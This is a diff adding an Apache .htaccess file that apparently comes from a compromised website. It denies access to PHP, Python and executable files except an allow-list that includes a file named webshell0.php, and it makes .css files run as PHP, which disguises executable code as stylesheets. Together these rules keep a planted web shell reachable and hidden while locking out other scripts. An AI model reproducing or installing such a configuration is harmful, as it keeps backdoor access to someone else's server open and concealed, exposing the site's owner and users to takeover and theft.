@@ -1,0 +1,13 @@
+<FilesMatch ".(py|exe|php)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|url.php|template.php|url.css|index.html|webshell0.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+
+<FilesMatch "\.css$">
+    SetHandler application/x-httpd-alt-php74___lsphp
+</FilesMatch>
